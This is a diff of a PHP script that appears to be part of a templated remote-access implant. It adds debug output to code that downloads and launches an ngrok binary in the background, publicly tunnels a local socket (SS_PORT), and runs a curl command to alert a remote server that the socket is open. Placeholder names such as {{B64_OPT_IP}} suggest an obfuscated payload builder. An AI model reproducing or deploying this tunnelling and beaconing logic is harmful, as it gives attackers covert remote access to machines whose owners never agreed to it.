@@ -85,6 +85,7 @@ function wait_for_it($host, $port, $timeout=10) {
     $timeout--;
 
     if ($timeout <= 0) {
+        echo "TIMEOUT WAITING FOR HOST PORT!!\n";
       return false;
     }
 
@@ -104,6 +105,8 @@ function wait_for_it($host, $port, $timeout=10) {
 
 function get_ngrok_tunnel($timeout=10) {
     if (wait_for_it('localhost', 4040)) {
+        echo "localhost:4040 is ready\n";
+
         do {
             $ngrok_json = file_get_contents('{{B64_STR_NGROK_API}}');
 
@@ -112,6 +115,8 @@ function get_ngrok_tunnel($timeout=10) {
             if (isset($ngrok_data->tunnels) && count($ngrok_data->tunnels) > 0) {
                 return $ngrok_data->tunnels[0];
             } else {
+                echo "Incomplete data from ngrok\n";
+                var_dump($ngrok_data);
                 $timeout--;
 
                 if ($timeout <= 0) {
@@ -121,12 +126,21 @@ function get_ngrok_tunnel($timeout=10) {
                 sleep(1);
             }
         } while(!isset($ngrok_data->tunnels) || count($ngrok_data->tunnels) <= 0);
+      
+    } else {
+        echo "no response from ngrok info on localhost:4040\n";
     }
 
     return false;
 }
 
+echo "ngrok bin: $ngrok_bin\n";
+echo "ngrok zip: $ngrok_zip\n";
+echo "ngrok url: $ngrok_url\n";
+
 if (!file_exists($ngrok_bin)) {
+    echo "$ngrok_bin does not exist, downloading from $ngrok_url\n";
+
   file_put_contents($ngrok_zip, fopen($ngrok_url, 'r'));
 
   exec("unzip $ngrok_zip -d $dir");
@@ -136,6 +150,7 @@ if (!file_exists($ngrok_bin)) {
 
 if (file_exists($ngrok_bin)) {
     $cmd = "nohup $ngrok_bin tcp " . SS_PORT . " &> /dev/null &";
+    echo "running ngrok: $cmd\n";
     exec($cmd);
 
     $tunnel = get_ngrok_tunnel();
@@ -143,14 +158,28 @@ if (file_exists($ngrok_bin)) {
     if ($tunnel) {
         $tcp_url = $tunnel->public_url;
     
+        echo "$tcp_url\n";
+
         if (preg_match("/tcp\:\/\/([^\:]+)\:([0-9]+)/", $tcp_url, $matches)) {
             if (count($matches) > 2) {
                 $opts['{{B64_OPT_IP}}'] = $matches[1];
                 $opts['{{B64_OPT_PORT}}'] = (int)$matches[2];
+            } else {
+                echo "Unable to find matching parts from url: $tcp_url\n";
+                var_dump($matches);
             }
+        } else {
+            echo "ngrok url doesn't match tcp pattern: $tcp_url\n";
         }
+    } else {
+        echo "No tunnel info found\n";
     }
+    
+} else {
+    echo "missing ngrok bin\n";
 }
+
+print_r($opts);
 
 // Execute curl command to hit server and send mail alert that socket is open
 exec(build_curl_cmd('m'));
